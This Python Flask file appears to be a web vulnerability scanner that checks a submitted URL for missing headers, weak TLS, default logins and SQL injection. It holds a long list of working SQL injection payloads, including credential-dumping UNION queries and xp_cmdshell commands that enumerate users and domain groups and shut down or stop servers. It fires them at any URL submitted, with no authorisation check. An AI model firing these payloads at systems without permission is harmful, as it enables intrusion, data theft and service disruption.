# app.py

import datetime
import db
from flask import Flask, request, render_template, redirect, url_for, jsonify
import requests
import ssl
import socket
from OpenSSL import SSL
from cryptography.x509 import load_pem_x509_certificate
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os

app = Flask(__name__)
app.secret_key = os.urandom(26)

# SQL injection payloads
sql_injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' /* ",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR '1'='1' OR ''='",
    "'='",
    "'LIKE'",
    "'=0--+",
    "OR 1=1",
    "OR 1=1--",
    "OR 1=1#",
    "OR 1=1/*",
    "admin'--",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or ('1'='1\")",
    "admin') or ('1'='1\" --",
    "admin') or ('1'='1\" #",
    "admin') or ('1'='1\" /*",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 'a'='a' ({",
    "' OR 'a'='a' /*",
    "' OR 'a'='a' /* ",
    "' OR 'a'='a'--",
    "' OR 'a'='a'#",
    "' OR 'a'='a'/*",
    "' OR 'a'='a' OR ''='",
    "admin' OR 'a'='a",
    "admin' OR 'a'='a' -- ",
    "admin' OR 'a'='a' ({",
    "admin' OR 'a'='a' /*",
    "admin' OR 'a'='a' /* ",
    "admin' OR 'a'='a'--",
    "admin' OR 'a'='a'#",
    "admin' OR 'a'='a'/*",
    "admin' OR 'a'='a' OR ''='",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT 1, 'anotheruser', 'doesntmatter' --",
    "' UNION SELECT null, null, null, null, null, null, null, null --",
    "' UNION SELECT null, null, null, null, null, null, null, null, null --",
    "' UNION SELECT 1,2,3,4,5,6,7,8 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
    "' OR 1=1 UNION SELECT null, null, null --",
    "' OR 1=1 UNION SELECT username, password FROM users --",
    "' OR 1=1 UNION SELECT 1, 'anotheruser', 'doesntmatter' --",
    "' OR 1=1 UNION SELECT null, null, null, null, null, null, null, null --",
    "' OR 1=1 UNION SELECT null, null, null, null, null, null, null, null, null --",
    "' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8 --",
    "' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9 --",
    "'; EXEC xp_cmdshell('dir');--",
    "'; EXEC xp_cmdshell('ipconfig');--",
    "'; EXEC xp_cmdshell('netstat');--",
    "'; EXEC xp_cmdshell('tasklist');--",
    "'; EXEC xp_cmdshell('whoami');--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1');--",
    "'; EXEC xp_cmdshell('nslookup google.com');--",
    "'; EXEC xp_cmdshell('tracert google.com');--",
    "'; EXEC xp_cmdshell('net user');--",
    "'; EXEC xp_cmdshell('net localgroup administrators');--",
    "'; EXEC xp_cmdshell('net group /domain');--",
    "'; EXEC xp_cmdshell('net use');--",
    "'; EXEC xp_cmdshell('net view');--",
    "'; EXEC xp_cmdshell('route print');--",
    "'; EXEC xp_cmdshell('arp -a');--",
    "'; EXEC xp_cmdshell('hostname');--",
    "'; EXEC xp_cmdshell('whoami /groups');--",
    "'; EXEC xp_cmdshell('whoami /priv');--",
    "'; EXEC xp_cmdshell('systeminfo');--",
    "'; EXEC xp_cmdshell('set');--",
    "'; EXEC xp_cmdshell('path');--",
    "'; EXEC xp_cmdshell('time');--",
    "'; EXEC xp_cmdshell('date');--",
    "'; EXEC xp_cmdshell('shutdown -s');--",
    "'; EXEC xp_cmdshell('shutdown -r');--",
    "'; EXEC xp_cmdshell('shutdown -l');--",
    "'; EXEC xp_cmdshell('shutdown -a');--",
    "'; EXEC xp_cmdshell('net stop server');--",
    "'; EXEC xp_cmdshell('net start server');--"
]


# Function to check for missing security headers
def check_security_headers(base_url):
    response = requests.get(base_url)
    headers = response.headers

    missing_headers = []
    security_headers = [
        'Content-Security-Policy',
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security'
    ]

    for header in security_headers:
        if header not in headers:
            missing_headers.append(header)

    return missing_headers

# Function to check if directory listing is enabled
def check_directory_listing(base_url):
    test_url = urljoin(base_url, '/')
    response = requests.get(test_url)
    
    if 'Index of' in response.text or response.status_code == 200 and 'Directory listing' in response.text:
        return True
    return False

# Function to check for default credentials
def check_default_credentials(base_url):
    common_credentials = {
        'admin': 'admin',
        'admin': 'password',
        'user': 'password',
        'root': 'root'
    }

    found_credentials = []
    for username, password in common_credentials.items():
        login_url = urljoin(base_url, '/')
        response = requests.get(login_url, auth=(username, password))
        if response.status_code == 200:
            found_credentials.append((username, password))

    return found_credentials

# Function to check for weak cipher suites
def check_weak_cipher_suites(base_url):
    weak_ciphers = [
        'TLS_RSA_WITH_AES_128_CBC_SHA',
        'TLS_RSA_WITH_AES_256_CBC_SHA',
        'TLS_RSA_WITH_3DES_EDE_CBC_SHA'
    ]

    weak_cipher_found = []
    hostname = urljoin(base_url, '/').split('/')[2]

    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)

    try:
        conn.connect((hostname, 443))
        cipher = conn.cipher()
        if cipher and cipher[0] in weak_ciphers:
            weak_cipher_found.append(cipher[0])
    except Exception as e:
        print(f"Error checking cipher suites: {e}")
    finally:
        conn.close()

    return weak_cipher_found

# Function to check for expired certificates
def check_expired_certificates(base_url):
    hostname = urljoin(base_url, '/').split('/')[2]

    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)

    expired_certificates = []
    try:
        conn.connect((hostname, 443))
        cert = conn.getpeercert(True)
        cert_obj = ssl.DER_cert_to_PEM_cert(cert)
        x509 = load_pem_x509_certificate(cert_obj.encode('utf-8'))
        if x509.not_valid_after < datetime.datetime.now():
            expired_certificates.append(x509.not_valid_after)
    except Exception as e:
        print(f"Error checking expired certificates: {e}")
    finally:
        conn.close()

    return expired_certificates

# Function to check for certificate chain issues
def check_certificate_chain_issues(base_url):
    hostname = urljoin(base_url, '/').split('/')[2]

    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)

    certificate_chain_issues = []
    try:
        conn.connect((hostname, 443))
        certs = conn.get_peer_cert_chain()
        if len(certs) < 2:
            certificate_chain_issues.append('Incomplete certificate chain')
    except Exception as e:
        print(f"Error checking certificate chain issues: {e}")
    finally:
        conn.close()

    return certificate_chain_issues

# Function to check for SQL injection vulnerabilities
def check_sql_injection(base_url):
    injection_results = []
    for payload in sql_injection_payloads:
        test_url = f"{base_url}?q={payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and ("sql" in response.text.lower() or "syntax" in response.text.lower()):
                injection_results.append(payload)
        except Exception as e:
            print(f"Error checking SQL injection: {e}")
    return injection_results

# Main scanning function
def scan(base_url):
    results = {
        "missing_security_headers": check_security_headers(base_url),
        "directory_listing_enabled": check_directory_listing(base_url),
        "default_credentials_found": check_default_credentials(base_url),
        "weak_cipher_suites": check_weak_cipher_suites(base_url),
        "expired_certificates": check_expired_certificates(base_url),
        "certificate_chain_issues": check_certificate_chain_issues(base_url),
        "sql_injection_found": check_sql_injection(base_url)
    }
    return results

# Routes for different functionalities
@app.route('/', methods=['GET', 'POST'])
def home():
    return render_template("index.html")

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    return render_template("signup.html")

@app.route('/signin', methods=['GET', 'POST'])
def signin():
    if request.method == 'POST':
        status, username = db.check_user()
        if status == True:
            return redirect(url_for('scanner'))
        else:
            data = {
                "username": username,
                "status": status
            }
            return jsonify(data)
    return render_template("signin.html")

@app.route('/register', methods=['GET', 'POST'])
def register():
    status = db.insert_data()
    return jsonify(status)

@app.route('/scanner', methods=['GET', 'POST'])
def scanner():
    return render_template('scanner.html')

@app.route('/scan', methods=['POST']) 
def scan_url():
    url = request.form.get('url')
    if url:
        results = scan(url)
        return jsonify(results)
    return jsonify({"error": "No URL provided"}), 400

if __name__ == '__main__':
    app.run(debug=True)
